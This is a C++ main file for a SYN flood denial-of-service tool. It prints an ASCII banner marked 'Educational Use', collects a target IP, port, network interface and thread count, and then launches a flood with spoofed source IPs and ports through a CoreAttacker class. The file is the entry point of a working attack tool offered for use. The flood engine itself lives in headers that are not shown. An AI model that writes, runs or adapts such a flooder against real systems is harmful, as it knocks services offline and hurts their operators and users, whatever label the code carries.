#include <iostream>
#include <cstdlib>
#include <stdexcept>
#include <ctime>
#include <string>
#include "cli/cli.hpp"
#include "core/attacker.hpp"

void clear_screen() {
    std::cout << "\033[2J\033[1;1H";
}

void print_banner() {
    std::cout << "                                   _   \n";
    std::cout << "                                  | |  \n";
    std::cout << " ___  ___  ___  _ __ ___   ___  __| |  \n";
    std::cout << "/ __|/ _ \\/ _ \\| '_ ` _ \\ / _ \\/ _` |  \n";
    std::cout << "\\__ \\  __/ (_) | | | | | |  __/ (_| |  \n";
    std::cout << "|___/\\___|\\___/|_| |_| |_|\\___|\\__,_|  \n";
    std::cout << "      SYN Flood Tool (Educational Use)\n";
    std::cout << "--------------------------------------------\n";
}

int main(int argc, char* argv[])
{
  clear_screen();
  print_banner();
  
  std::srand(std::time(0));

  try{
    ArgumentsProcessor processor(argc, argv);
    TargetInfo target;
    
    if (argc == 1) {
        target = processor.interactive_mode();
    } else {
        target = processor.process();
    }
    
    std::cout << "\n--------------------------------------------\n";
    std::cout << "Attack Setup Complete:\n";
    std::cout << "  Target IP:   " << target.ip << std::endl;
    std::cout << "  Target Port: " << target.port << std::endl;
    std::cout << "  Interface:   " << (target.interface.empty() ? "DEFAULT (not bound)" : target.interface) << std::endl;
    std::cout << "  Threads:     " << target.threads_count << std::endl;
    std::cout << "  Mode:        SYN Flood (Spoofed Source IP/Port)\n";
    std::cout << "--------------------------------------------\n";
    std::cout << "Starting flood. Press CTRL+C to stop...\n\n";

    CoreAttacker attacker(target, target.threads_count);
    attacker.start_flood();
    
  }
  catch(const std::exception& e){
    std::cerr << "\nFATAL SYSTEM ERROR: " << e.what() << std::endl;
    return 1;
  }

  return 0;
}
